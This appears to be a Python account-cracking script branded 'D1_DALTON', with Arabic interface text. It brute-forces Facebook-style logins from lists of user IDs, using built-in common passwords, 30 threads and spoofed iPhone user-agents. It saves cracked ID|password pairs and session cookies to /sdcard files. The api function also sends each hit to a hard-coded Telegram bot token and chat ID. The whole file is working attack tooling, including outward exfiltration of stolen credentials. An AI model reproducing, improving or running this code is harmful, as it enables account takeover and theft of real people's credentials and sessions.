import datetime;now = datetime.date.today();target = datetime.date(2027,5,12,)
if now >=target:print(" DALTON_PY@ :ﺓﺪﻳﺪﺟ ،ﺓﺍﺩﻷﺍ ﻑﺎﻘﻳﺍ ﻢﺗ")
else:print("")
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
print('[\033[1;32m~\033[1;37m] ﺓﺍﺩﻻﺍ ﺭﺍﺪﺻﺇ :- 1.0 ')
print('[\033[1;32m~\033[1;37m] ﺓﺍﺩﻻﺍ ﺚﻳﺪﺤﺗ ﻱﺭﺎﺟ ﺮﻈﺘﻧﺍ ! ')


Goldtok = '7188043475:AAH3dfZpp6FRQQEnZ4QBuC0d1NTbUwhqsVY'
Goldid = '6877450404'
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print(' \x1b[1;93mتﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ😎 : \033[1;32m'+total_ids)
                        linex()
                        for user in id:
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;91m [1] \x1b[1;92mﻒﻠﻣ ﻦﻣ ﺪﻴﺻ')
                        linex()
                        xd=input(' ﺮﺘﺧﺍ > ')
                        if xd in ['1','01']:
                               
                                linex()
                                file = input(' ﻒﻠﻤﻟﺍ ﺭﺎﺴﻣ \033[1;32m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' ﺭﺎﺴﻣ ﻦﻣ ﺪﻛﺎﺗﺍ ﺄﻄﺧ ﻒﻠﻤﻟﺍ ﺭﺎﺴﻣ ')
                                        time.sleep(1)
                                        menu()
                                linex()
                                print(' \x1b[1;91m[1] \x1b[1;92mﺔﻘﻳﺮﻃ \x1b[1;96m1  \n \x1b[1;91m ')
                                linex()
                                mthd=input(' ﺮﺘﺧﺍ: ')
                                linex()
                                plist = []
                                print('\x1b[1;93m 1. \x1b[1;92mﺓﺰﻫﺎﺟ ﺕﺍﺩﺭﻮﺳﺎﺑ \n \x1b[1;93m2. \x1b[1;92mﺕﺍﺩﺭﻮﺳﺎﺑ ﺔﻓﺎﺿﺍ ');linex()
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('987654321')
                                        plist.append('0987654321')
                                        plist.append('654321')
                                        plist.append('87654321')
                                        plist.append('7654321')
                                        plist.append('5432154321')
                                        plist.append('1q2w9o0p@@SS')
                                        plist.append('حسين حسين')
                                        plist.append('adminadmin')
                                        plist.append('admin admin')
                                        plist.append('ياحسين')
                                        plist.append('ياعباس')
                                        plist.append('ياحسن')
                                        plist.append('ياعلي')
                                        ...
                                        plist.append('ياعراق')
                                        plist.append('111qqq')
                                        plist.append('1111qqqq')
                                        plist.append('ياعبدالله')
                                        plist.append('qwer1234')
                                        plist.append('١٢٣٤٥٦')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mﻒﻠﻤﻟﺎﺑ ﺕﺎﻳﺪﻳﺍ ﺩﺪﻋ : \033[1;32m'+total_ids)
                                        print("\033[1;32m ﺪﻴﺻ ﻊﺿﻭ ﻞﻴﻐﺸﺗ ﻢﺗ")
                                        print("\033[1;34m ﺪﻴﺻ ﺭﻮﺻ ﻞﺳﺭﺍ @D1_DALTON")
                                        linex()
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        clear()
                        tl = str(len(user))
                        print(' ﻚﻔﻠﻣ تﺎﻳﺪﻳﺍ دﺪﻋ : \033[1;32m'+tl)
                        print(f'\033[1;32m D1_DALTON ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as ASX:
                        clear()
                        tl = str(len(user))
                        print(' تﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ😎 : \033[1;32m'+tl)
                        print(' \033[1;32m D1_DALTON ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
...
def gmail():
                ...
                with tred(max_workers=30) as ASX:
                        total = str(len(fo))
                        clear()
                        print(' تﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ😎 : \033[1;32m'+total)
                        print("\033[1;32m D1_DALTON ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mD1_DALTON\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [D1_DALTON-OK] %s | %s'%(ids,pas))
                                bn = ('\r\r\033[1;32m [D1_DALTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                ...
                                open('/sdcard/D1_DALTON-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/D1_DALTON-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [D1_DALTON-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/D1_DALTON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [D1_DALTON] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [D1_DALTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        bn = ('\r\r\033[1;32m [D1_DALTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(bn))
                                        open('/sdcard/D1_DALTON-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [DALTON] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [DALTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/D1_DALTONCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        #print(data)
                        accessToken="6331776307:AAGIL_vYRZBPTGn-o5tZMPs5Xo3PtvuX20o"
                        headers={
                                    "method": 'GET', 
    "path": '/',
    "scheme": 'https', 
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [D1_DALTON-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/D1_DALTON-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/D1_DALTON_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [D1_DALTON-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/D1_DALTON-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
